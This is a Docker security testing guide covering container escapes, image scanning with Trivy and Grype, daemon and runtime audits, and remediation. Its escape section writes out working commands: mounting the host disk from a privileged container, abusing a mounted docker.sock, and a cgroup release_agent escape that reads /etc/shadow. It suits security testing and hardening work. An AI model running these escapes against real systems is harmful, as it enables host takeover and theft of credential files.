# Docker Security Testing Guide

## Overview

Docker containers are widely deployed but often misconfigured. Testing focuses on container
escape vectors, image supply-chain risks, runtime misconfigurations, and daemon security.

## Container Escape Techniques

### Privileged Mode Escape
A container running with `--privileged` has full access to host devices.
```bash
# Check if we are privileged
cat /proc/self/status | grep CapEff
# If CapEff is 0000003fffffffff, we are privileged
# Mount host filesystem
mkdir /mnt/host && mount /dev/sda1 /mnt/host
# Access host via chroot
chroot /mnt/host bash
```

### Docker Socket Mount Escape
If `/var/run/docker.sock` is mounted inside the container:
```bash
# List host containers
docker -H unix:///var/run/docker.sock ps
# Spawn privileged container mounting host root
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host bash
```

### Kernel Exploit Vectors
- CVE-2022-0185 (heap overflow in filesystem context)
- CVE-2022-0847 (DirtyPipe - write to arbitrary files)
- CVE-2024-21626 (runc process.cwd container escape)

### cgroup Escape (notify_on_release)
```bash
# Requires cgroup v1 and write to cgroup release_agent
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "#!/bin/sh" > /cmd
echo "cat /etc/shadow > /tmp/cgrp/output" >> /cmd
chmod a+x /cmd
echo "/cmd" > /tmp/cgrp/release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

## Image Security Scanning

### Trivy
```bash
# Scan local image for vulnerabilities
trivy image target-image:latest
# Scan with severity filter
trivy image --severity HIGH,CRITICAL target-image:latest
# Scan a running container filesystem
trivy fs /
```

### Grype
```bash
grype target-image:latest
```

### Common Image Issues
- Running as root (no `USER` directive in Dockerfile)
- Secrets baked into image layers (`docker history --no-trunc IMAGE`)
- Using `latest` tag without pinning digests
- Base images with known CVEs

## Daemon Configuration Audit

### Check Docker Daemon Settings
```bash
# Inspect daemon configuration
docker system info
cat /etc/docker/daemon.json
# Check for TLS on remote API
curl -k https://TARGET:2376/version
# Unauthenticated remote API (critical finding)
curl http://TARGET:2375/containers/json
```

### Key Daemon Hardening Checks
- Is user namespace remapping enabled? (`userns-remap`)
- Is the default seccomp profile active?
- Is AppArmor/SELinux enforcing?
- Are inter-container communications restricted? (`icc: false`)
- Is content trust enabled? (`DOCKER_CONTENT_TRUST=1`)

## Runtime Security Checks
```bash
# List containers with capabilities
docker inspect --format '{{.HostConfig.CapAdd}}' CONTAINER
# Check for host network mode
docker inspect --format '{{.HostConfig.NetworkMode}}' CONTAINER
# Check for host PID namespace
docker inspect --format '{{.HostConfig.PidMode}}' CONTAINER
```

## Tools
- **Trivy** - comprehensive image and filesystem scanner
- **Docker Bench Security** - CIS Docker benchmark (`docker-bench-security`)
- **Falco** - runtime threat detection
- **Grype** - vulnerability scanner for container images
- **Deepce** - Docker enumeration and escape tool

## Remediation
- Never run containers in privileged mode
- Do not mount the Docker socket into containers
- Use read-only root filesystems (`--read-only`)
- Drop all capabilities and add only what is needed (`--cap-drop ALL --cap-add NET_BIND_SERVICE`)
- Enable user namespace remapping in the daemon
- Scan images in CI/CD pipelines before deployment
- Use distroless or scratch base images to minimize attack surface
